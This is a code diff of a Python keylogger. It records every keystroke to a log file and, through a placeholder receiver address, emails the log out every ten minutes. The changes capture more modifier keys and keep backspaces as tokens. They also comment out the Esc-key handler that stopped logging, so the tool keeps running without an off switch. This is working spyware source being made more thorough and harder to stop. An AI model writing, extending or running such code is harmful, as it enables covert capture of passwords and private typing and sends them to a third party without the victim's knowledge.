@@ -16,7 +16,9 @@ TOEMAIL = "RECEIVER" # REPLACE
 CYCLE = 60 * 10 # Time interval to Email and Clean Logs. (10 Minutes)
 FILENAME = "log.txt" # Filename.
 finished = False # Global Track to see if Log is finished.
-ReplaceCode = {Key.space: ' ', Key.enter: '\n', Key.tab: ' ', Key.esc: ' [esc] '} # Dict Containing Non-alpha keys.
+
+# Dictionary stores all non-alphanumeric keys.
+ReplaceCode = {Key.space: ' ', Key.enter: ' [enter]\n', Key.tab: '[tab]', Key.esc: ' [esc] ', Key.shift: ' [shift] ', Key.ctrl: ' [ctrl] ', Key.backspace: ' [back] ', Key.cmd: ' [cmd] ', Key.alt: ' [alt] '}
 
 # Key Press.
 def on_press(key):
@@ -27,23 +29,15 @@ def on_press(key):
         text = key.char
     elif key in ReplaceCode:
         text = ReplaceCode[key]
-    elif key == Key.backspace: # Remove last character in file if backspace was read.
-        with open(FILENAME, 'rb+') as file:
-            try: #Only delete last character if the text file has text.
-                file.seek(-1, os.SEEK_END)
-                file.truncate()
-                pass
-            except Exception: # Otherwise exception is found.
-                print("No content to be deleted in the file.\n")
 
     # Write to file if text is valid.
     if text != None:
         write_file(FILENAME, text)
 
-def on_release(key):
+#def on_release(key):
     # Stops Log Execution if Esc is pressed.
-    if key == Key.esc:
-        return False
+ #   if key == Key.esc:
+  #      return False
 
 def IntervalEmailandCls():
 
